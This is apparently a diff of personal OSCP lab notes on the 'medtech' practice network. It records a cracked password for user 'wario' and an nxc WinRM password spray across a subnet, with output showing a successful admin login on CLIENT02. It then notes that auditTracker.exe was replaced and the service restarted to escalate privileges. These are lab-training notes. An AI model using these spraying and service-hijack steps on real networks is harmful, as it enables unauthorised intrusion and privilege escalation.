@@ -154,4 +154,27 @@ fdf36048c1cf88f5630381c5e38feb8e
 fdf36048c1cf88f5630381c5e38feb8e:Mushroom! 
 
 wario:Mushroom!
+
+┌─[✗]─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
+└──╼ #nxc winrm 172.16.163.0/24 -u wario -p Mushroom! 
+WINRM       172.16.163.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:medtech.com)
+WINRM       172.16.163.11   5985   FILES02          [*] Windows Server 2022 Build 20348 (name:FILES02) (domain:medtech.com)
+WINRM       172.16.163.12   5985   DEV04            [*] Windows Server 2022 Build 20348 (name:DEV04) (domain:medtech.com)
+WINRM       172.16.163.13   5985   PROD01           [*] Windows Server 2022 Build 20348 (name:PROD01) (domain:medtech.com)
+WINRM       172.16.163.10   5985   DC01             [-] medtech.com\wario:Mushroom!
+WINRM       172.16.163.11   5985   FILES02          [-] medtech.com\wario:Mushroom!
+WINRM       172.16.163.83   5985   CLIENT02         [*] Windows 11 Build 22000 (name:CLIENT02) (domain:medtech.com)
+WINRM       172.16.163.12   5985   DEV04            [-] medtech.com\wario:Mushroom!
+WINRM       172.16.163.13   5985   PROD01           [-] medtech.com\wario:Mushroom!
+WINRM       172.16.163.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)
+WINRM       172.16.163.254  5985   WEB02            [*] Windows Server 2022 Build 20348 (name:WEB02) (domain:medtech.com)
+WINRM       172.16.163.254  5985   WEB02            [-] medtech.com\wario:Mushroom!
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+```
+
+
+Replaced the auditTracker.exe, and used
+```
+sc.exe start audittracker
 ```
